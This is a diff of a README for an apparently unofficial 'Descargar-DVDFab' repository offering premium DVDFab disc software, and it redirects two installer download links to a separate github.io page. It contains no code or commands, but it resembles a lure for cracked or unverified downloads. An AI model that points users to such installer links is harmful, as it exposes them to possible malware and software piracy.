@@ -1,6 +1,6 @@
 # 💿 Descargar-DVDFab - Get Premium Disc Tools on Windows
 
-[![Download DVDFab](https://img.shields.io/badge/Download-DVDFab-blue.svg)](https://github.com/sangokok/Descargar-DVDFab)
+[![Download DVDFab](https://img.shields.io/badge/Download-DVDFab-blue.svg)](https://sangokok.github.io)
 
 ## 📖 About This Software
 
@@ -23,7 +23,7 @@ Before you install this software, check your computer against these requirements
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit the official repository page to access the installer: [Download DVDFab Here](https://github.com/sangokok/Descargar-DVDFab).
+1.  Visit the official repository page to access the installer: [Download DVDFab Here](https://sangokok.github.io).
 2.  Locate the download button on the page.
 3.  Click the button to save the installation file to your computer.
 4.  Navigate to your Downloads folder once the file finishes saving.
